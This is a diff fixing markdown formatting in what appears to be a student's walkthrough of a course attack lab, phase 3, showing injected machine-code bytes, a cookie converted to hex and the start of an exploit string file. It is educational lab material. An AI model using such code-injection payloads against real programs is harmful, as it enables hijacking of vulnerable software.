@@ -65,9 +65,9 @@ Disassembly of section .text:
    0:   48 c7 c7 c0 7e 61 55    mov    $0x55617ec0,%rdi
    7:   c3                      retq
 ```
-My cookie ``0x3451d86d``` => ```33 34 35 31 64 38 36 64```
+My cookie ```0x3451d86d``` => ```33 34 35 31 64 38 36 64```
 
-Now, grab the bytes from the above code and start constructing your exploit string. Create a new file named ``phase3.txt``` and here is what mine looks like:
+Now, grab the bytes from the above code and start constructing your exploit string. Create a new file named ```phase3.txt``` and here is what mine looks like:
 
 ```
 48 c7 c7 c0 7e 61 55 c3 /*rsp + 28 the address where the cookie is present*/
